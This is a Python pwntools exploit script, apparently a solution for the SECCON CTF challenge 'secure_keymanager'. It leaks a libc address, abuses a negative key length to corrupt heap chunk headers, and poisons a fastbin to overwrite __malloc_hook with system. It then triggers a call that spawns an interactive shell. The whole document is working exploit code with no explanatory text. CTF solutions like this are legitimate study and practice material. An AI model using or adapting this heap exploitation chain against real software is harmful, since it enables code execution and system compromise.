from pwn import *

c = process('./secure_keymanager')
#c = remote('secure_keymanager.pwn.seccon.jp', 47225)

stdout_so = 0x3c5620
malloc_so = 0x3c4b10
system_so = 0x045390

def add(_key, title, size='', line=1):
  if size is '':
    size = len(key)
  c.sendline('1')
  c.recvuntil('Input key length...')
  c.sendline(str(size))
  c.recvuntil('Input title...')
  if line:
    c.sendline(title)
  else:
    c.send(title)
  if int(str(size), 10) > 1:
    c.recvuntil('Input key...')
    if line:
      c.sendline(_key)
    else:
      c.send(_key)
  
def edit(id, _key, line=1):
  c.sendline('3')
  c.recvuntil('Input Account Name >> ')
  c.sendline(account)
  c.recvuntil('Input Master Pass >> ')
  c.sendline(master)
  c.recvuntil('Input id to edit...')
  c.sendline(str(id))
  c.recvuntil('Input new key...')
  if line:
    c.sendline(_key)
  else:
    c.send(_key)
def delete(id, ok=1):
  c.sendline('4')
  c.recvuntil('Input Account Name >> ')
  c.sendline(account)
  c.recvuntil('Input Master Pass >> ')
  c.sendline(master)
  c.recvuntil('Input id to remove...')
  c.sendline(str(id))
  if ok:
    c.recvuntil('>>')

def reg(account,master):
  c.recvuntil('>>')
  c.sendline(account)
  c.recvuntil('>>')
  c.sendline(master)
  
account = "/bin/sh\x00"
master = 'ok\x00'
  
reg(account,master)
c.sendline('9')
c.recvuntil('>>')
payload = 'X' * 0x18
c.send(payload)
c.recvuntil(payload)

libc_leak = u64(c.recv(6).ljust(8, chr(0)))
libc_base = libc_leak - stdout_so
__malloc_hook = libc_base + malloc_so
system = libc_base + system_so
print "libc_base @ " + hex(libc_base)
print "malloc_hook @ " + hex(__malloc_hook)

add('A', 'A', '-32')
add('B', 'B', 0x10)
fake = p64(0)*3
fake += p32(0x71)
add(fake, 'C', 0x48, 0)

delete(0)
delete(2)

payload = 'A' * 8*3
payload += p32((0x40*2) + 0x1)
payload += chr(0)*2
add('A', payload, '-32', 0)

target = __malloc_hook - 0x30 + 0xd

payload = 'B' * 0x8*3
payload += p64(0x71)
payload += p64(target)
edit(1, payload)

add('E', 'E', 0x48)
payload = 'F' * 0x13
payload += p64(system)
add('F', payload, 0x48, 0)

c.sendline("1")
c.sendline(str(0x6020C0 - 0x20))

c.interactive()
